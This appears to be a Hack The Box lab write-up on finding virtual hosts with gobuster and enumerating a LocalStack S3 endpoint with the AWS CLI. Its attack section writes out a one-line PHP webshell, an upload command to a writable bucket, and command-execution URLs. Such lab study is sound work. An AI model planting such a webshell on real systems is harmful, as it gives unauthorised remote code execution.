# S3 Enumeration & Subdomain Discovery

Tags: #htb #enumeration #s3 #vhost #aws #web

---

## Core Concept: Virtual Hosting

A single server (one IP) can host **multiple websites** by reading the `Host:` header in every HTTP request:

```
GET / HTTP/1.1
Host: thetoppers.htb   ← server routes based on this
```

This means subdomains like `s3.thetoppers.htb` can point to completely different services on the same machine — not just different webpages.

> **Practical tip:** Always grep the page source for domain hints early on.
> 
> ```bash
> curl -s http://<IP> | grep -Ei "\.htb"
> ```

---

## Finding the Domain Name

The domain is never given to you directly. Common places to find it:

- Page source (`Email:`, `href=`, `src=` attributes)
- HTTP response headers (`curl -I http://<IP>`)
- HTB machine name on the dashboard (usually `<machinename>.htb`)

Once found, register it locally — `.htb` domains don't exist on the real internet:

```bash
echo "<IP>  thetoppers.htb" | sudo tee -a /etc/hosts
```

---

## Subdomain / Vhost Enumeration

### Why

Subdomains can expose hidden admin panels, APIs, or services not linked from the main site.

### How (gobuster)

```bash
gobuster vhost -u http://thetoppers.htb \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  --append-domain
```

> `--append-domain` is required in newer gobuster versions — without it, vhost mode breaks.

When a subdomain is found, add it to `/etc/hosts` too:

```bash
echo "<IP>  s3.thetoppers.htb" | sudo tee -a /etc/hosts
```

---

## What is S3?

**Amazon S3 (Simple Storage Service)** is a cloud file storage API. Files are stored in **buckets** (think: named folders). You interact with it via API calls, not a browser — visiting `/` returns 404 by design.

### LocalStack / Fake S3

Servers can run a **local S3-compatible service** (e.g. LocalStack) that mimics the Amazon S3 API exactly. Finding an `s3.<domain>` subdomain on an HTB machine almost always means this.

**A 404 on `s3.thetoppers.htb` does NOT mean it's dead** — it just means there's no default webpage. Use a proper S3 client.

---

## Enumerating S3 with AWS CLI

The AWS CLI speaks the S3 protocol. Point it at the local endpoint instead of Amazon:

```bash
# List all buckets (no real credentials needed for misconfigured S3)
aws --endpoint-url http://s3.thetoppers.htb s3 ls --no-sign-request

# If credentials are required, configure dummy ones first
aws configure
# Key ID:     temp
# Secret Key: temp
# Region:     us-east-1
# Format:     json

# List contents of a specific bucket
aws --endpoint-url http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```

---

## Attack Path: Misconfigured Writable S3 Bucket

If the bucket is **publicly writable** (a common misconfiguration), you can upload files that get served by the web server:

```
Find s3.thetoppers.htb
        ↓
List buckets → find thetoppers.htb bucket
        ↓
Check contents → site files are stored here
        ↓
Upload a PHP webshell
        ↓
Visit http://thetoppers.htb/shell.php
        ↓
Remote Code Execution 🎉
```

### PHP Webshell (minimal)

```php
<?php system($_GET['cmd']); ?>
```

### Upload via AWS CLI

```bash
aws --endpoint-url http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb/shell.php
```

### Execute

```
http://thetoppers.htb/shell.php?cmd=id
http://thetoppers.htb/shell.php?cmd=cat+/flag.txt
```

---

## Key Takeaways

|Concept|Takeaway|
|---|---|
|Virtual hosting|One IP → many services, routed by `Host:` header|
|`.htb` domains|Fake TLD, must be added to `/etc/hosts` manually|
|S3 404 on `/`|Normal — S3 is an API, not a website|
|`--endpoint-url`|Redirects AWS CLI to a local/fake S3 server|
|Writable bucket|Can lead to RCE if web server serves bucket contents|

---

## HTB Machine: The Toppers

- **IP:** `10.129.227.248`
- **Domain found:** `thetoppers.htb` (leaked in page source via `mail@thetoppers.htb`)
- **Subdomain found:** `s3.thetoppers.htb` (via gobuster vhost)
- **Attack vector:** Misconfigured S3 bucket → PHP webshell upload → RCE